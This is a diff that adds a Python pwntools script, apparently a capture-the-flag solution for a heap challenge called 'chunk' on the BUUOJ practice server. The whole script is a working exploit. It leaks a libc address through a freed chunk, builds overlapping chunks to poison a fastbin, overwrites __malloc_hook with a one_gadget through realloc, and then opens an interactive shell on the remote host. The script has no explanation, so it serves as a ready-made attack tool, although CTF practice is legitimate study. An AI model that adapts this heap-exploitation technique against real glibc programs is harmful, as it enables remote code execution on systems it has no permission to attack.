@@ -1,0 +1,61 @@
+from LibcSearcher import *
+from pwn import *
+
+r=remote("node3.buuoj.cn",29431)
+#r=process(["./chunk"],env={"LD_PRELOAD":"./libc-2.23.so"})
+elf=ELF("./chunk")
+def add(ID,size):
+	r.recvuntil(": ")
+	r.sendline("1")
+	r.recvuntil(": ")
+	r.sendline(str(ID))
+	r.recvuntil(": ")
+	r.sendline(str(size))
+def show(ID):
+	r.recvuntil(": ")
+	r.sendline("2")
+	r.recvuntil("?")
+	r.sendline(str(ID))
+	r.recvuntil(": ")
+def edit(ID,Content):
+	r.recvuntil(": ")
+	r.sendline("4")
+	r.recvuntil("?")
+	r.sendline(str(ID))
+	r.recvuntil(": ")
+	r.sendline(Content)
+def delete(ID):
+	r.recvuntil(": ")
+	r.sendline("3")
+	r.recvline()
+	r.sendline(str(ID))
+#infomation leak
+add(0,0xf0)
+add(1,0xf0)
+delete(0)
+delete(1)
+add(0,0xf0)
+show(0)
+malloc_hook_addr=u64(r.recv(6).ljust(8,'\x00'))-88-0x10
+libc=LibcSearcher("__malloc_hook",malloc_hook_addr)
+libc_base=malloc_hook_addr-libc.dump("__malloc_hook")
+realloc_addr=libc_base+libc.dump("realloc")
+one_gadget_addr=libc_base+0xf1147
+#fake chunk
+add(1,0xf0)
+add(3,0x68)
+add(2,0xf0)
+add(4,0x20)
+delete(1)
+edit(3,'a'*0x60+p64(0x170))
+delete(2)
+add(9,0xf0)
+add(5,0x60)
+delete(5)
+edit(3,p64(malloc_hook_addr-0x23))
+add(6,0x60)
+add(7,0x60)
+#edit(7,'a'*0x13+p64(one_gadget_addr))
+edit(7,'a'*0xb+p64(one_gadget_addr)+p64(realloc_addr+2))
+add(8,0x60)
+r.interactive()
